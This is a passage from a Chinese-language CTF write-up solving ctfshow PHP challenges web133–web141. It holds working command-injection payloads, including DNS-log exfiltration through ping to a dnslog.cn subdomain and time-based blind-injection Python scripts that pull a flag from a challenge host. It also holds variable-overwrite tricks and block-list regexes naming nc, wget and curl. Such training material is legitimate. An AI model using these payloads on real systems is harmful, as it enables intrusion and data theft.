href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p></blockquote><p>如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F` ;ping `awk &#x27;/flag/&#x27; flag.php`.r9y19m.dnslog.cn</span><br></pre></td></tr></table></figure><h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><h3 id="考点：parse-str-extract-变量覆盖-SERVER-‘QUERY-STRING‘"><a href="#考点：parse-str-extract-变量覆盖-SERVER-‘QUERY-STRING‘" class="headerlink" title="考点：parse_str extract 变量覆盖 $_SERVER[‘QUERY_STRING‘]"></a>考点：parse_str extract 变量覆盖 $_SERVER[‘QUERY_STRING‘]</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688286972700-618666d8-7700-4fa8-ab03-9d6b3e8bbb96.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688286996311-78647e9b-287c-4595-b0bb-f83e25c8dcd9.png" alt="image.png"><br>parse_str()–将字符串解析成多个变量；如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域<br>extract()–从数组中将变量导入到当前的符号表，将键名当作变量名，值作为变量的值（默认覆盖）<br>注意两个的区别：<br>extract是将数组中元素分解,执行后数组的key值作为变量名，数组的value赋值给对应Key的变量，这样可以直接通过Key变量去访问，不用数组加key去访问。<br>即：从数组中创建变量<br>parse_str是根据”=”来分解字符串，主要用于对url参数的解析。<br><a href="https://blog.csdn.net/qq_49480008/article/details/115872899">$_SERVER[‘QUERY_STRING’]解释</a><br>因此题目不允许使用get和post传参key1、key2。<br>可以使用变量覆盖来代替。既然是extract的$_POST，就利用parse_str把$_POST给覆盖掉</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET传入：?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688287514767-2aa1edab-16f3-47ba-8a43-2f467c423246.png" alt="image.png"><br>因此对这道题，就可以使用：<br><code>?_POST[key1]=36d&amp;_POST[key2]=36d</code>即可</p><h1 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h1><h3 id="考点：cp-复制命令"><a href="#考点：cp-复制命令" class="headerlink" title="考点：cp 复制命令"></a>考点：cp 复制命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接就<br><code>?F=</code>$F<code>;+cp flag.php 1.txt</code>然后直接访问1.php即可<br>将flag拼接一下即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688287983071-0361bebd-0ba2-463b-9d70-8ea473219d69.png" alt="image.png"><br>或者使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>` ;uniq flag.php&gt;<span class="number">4</span>.txt;</span><br></pre></td></tr></table></figure><p>hint里面给的是另一种做法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$F`;+ping `cat flag.php|awk &#x27;NR==2&#x27;`.6x1sys.dnslog.cn</span><br></pre></td></tr></table></figure><p>但是cat被禁用了，因此不能使用这个。</p><h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><h3 id="考点：tee命令-nl命令"><a href="#考点：tee命令-nl命令" class="headerlink" title="考点：tee命令 nl命令"></a>考点：tee命令 nl命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件<br><code>?c=ls / | tee aa</code>然后访问并下载aa文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688288948090-6f642158-d974-4d5d-8416-932f4888a3e2.png" alt="image.png"><br>发现根目录疑似flag文件<br><code>?c=nl /f149_15_h3r3 | tee f149</code> 然后打开f149<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688289105580-d4a21cf9-e76b-462f-8a15-1aa51ce93fa2.png" alt="image.png"></p><h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><h3 id="考点：考察调用类中的函数-call-user-func"><a href="#考点：考察调用类中的函数-call-user-func" class="headerlink" title="考点：考察调用类中的函数 call_user_func()"></a>考点：考察调用类中的函数 call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>调用类中的函数class A 方法b：<code>A::b</code><br>call_user_func()–第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。<br>POST：<code>ctfshow=ctfshow::getFlag</code></p><h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><h3 id="考点：调用类中函数第二种方法-数组法"><a href="#考点：调用类中函数第二种方法-数组法" class="headerlink" title="考点：调用类中函数第二种方法 数组法"></a>考点：调用类中函数第二种方法 数组法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688289560150-63dcb3a2-c27a-4d0f-a1f3-580b1cd901c3.png" alt="image.png"><br>注意区别：</p><ul><li>strpos()– 查找指定字符串在目标字符串中首次出现的位置（区分大小写）</li><li>stripos()–查找指定字符串在目标字符串中首次出现的位置（不区分大小写）</li><li>strrpos()– 计算指定字符串在目标字符串中最后一次出现的位置（区分大小写）</li><li>strripos()– 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</li></ul><p>因此题目考察的是如何不使用<code>:</code>来调用类内方法<br>可以使用数组来引用：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688289744599-3b42f093-7c8b-4685-b53f-00b176f94972.png" alt="image.png"><br>call_user_func中不但可以传字符串也可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure><p>payload：POST<code>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></p><h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><h3 id="考点：awk-cut-if"><a href="#考点：awk-cut-if" class="headerlink" title="考点：awk cut if"></a>考点：awk cut if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exec没有回显<br>想用：<code>?c=ls / | tee aa</code>，但是发发现访问不到aa文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688290331215-d4c2b5b5-f4d4-4719-87ec-1393e64c3b91.png" alt="image.png"></p><h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><p>awk 逐行读取：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688290537743-e32842ed-341e-41bd-8c19-bc659868b073.png" alt="image.png"><br>cut逐列读取：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688290611229-595d5f0e-8a8d-4a9f-b59f-ade99eb292cd.png" alt="image.png"><br>if判断命令是否执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            url=<span class="string">&quot;http://ee1ce1bf-c131-4dc1-be88-1082e434a1e3.challenge.ctf.show/?c=&quot;</span>+payload</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result=result+n</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                key=<span class="number">1</span></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688290763049-69ae9d93-db27-40cd-ae6e-645d1ae3d737.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688291149460-97d61af1-0661-4c40-8af1-b9afed119423.png" alt="image.png"><br>他这里这个脚本跑起来跑不全，需要改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = string.ascii_letters + <span class="string">&#x27;_&#x27;</span> + string.digits</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            payload = <span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i, j, n)</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            url = <span class="string">&quot;http://ee1ce1bf-c131-4dc1-be88-1082e434a1e3.challenge.ctf.show/?c=&quot;</span> + payload</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url, timeout=(<span class="number">2.5</span>, <span class="number">2.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + n</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> n == <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688293110076-8d3f0fb2-e9e4-47df-82f3-547a877b0e21.png" alt="image.png"><br>注意到flag文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span>+<span class="string">&quot;&#123;&quot;</span>+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(j)</span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        url=<span class="string">&quot;http://ee1ce1bf-c131-4dc1-be88-1082e434a1e3.challenge.ctf.show/?c=&quot;</span>+payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result=result+n</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>因为过滤了{}所以会我们就不加{}出来，跑出来flag然后手动添加就可以了。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688293399146-d96d2d3d-2a8f-4646-86c4-72810f1d8958.png" alt="image.png"></p><h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><h3 id="考点：弱比较"><a href="#考点：弱比较" class="headerlink" title="考点：弱比较"></a>考点：弱比较</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; isset($_POST[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    $f1 = (String)$_POST[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    $f2 = (String)$_POST[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="built_in">eval</span>(<span class="string">&quot;return $f1($f2());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                echo file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688293610613-bc6827a3-2d29-4cb6-bd35-908e49522276.png" alt="2ef141f4c1b04e2fb0d624be17b44e63.png"><br>f1 f2均有小写字母和数字组成。<br>可以看到0和字符串进行弱比较的时候返回的是true，因为==在进行比较的时候，会先将字符串类型转化成相同，再比较，而ctfshow是一个字符串，和0相比较的时候要转换成数字，ctfshow转换成数字的时候是0，所以相等返回true<br>而intval()函数会将非数字或非数字字符串转换为0，所以我们只要使code为字符串即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">f1=md5&amp;f2=phpinfo</span><br><span class="line">或</span><br><span class="line">f1=sha1&amp;f2=md5</span><br><span class="line">或</span><br><span class="line">f1=md5&amp;f2=md5</span><br><span class="line">提示是这个：</span><br><span class="line">f1=usleep&amp;f2=usleep</span><br><span class="line">//还有很多</span><br></pre></td></tr></table></figure><h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><h3 id="考点：正则"><a href="#考点：正则" class="headerlink" title="考点：正则"></a>考点：正则</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span 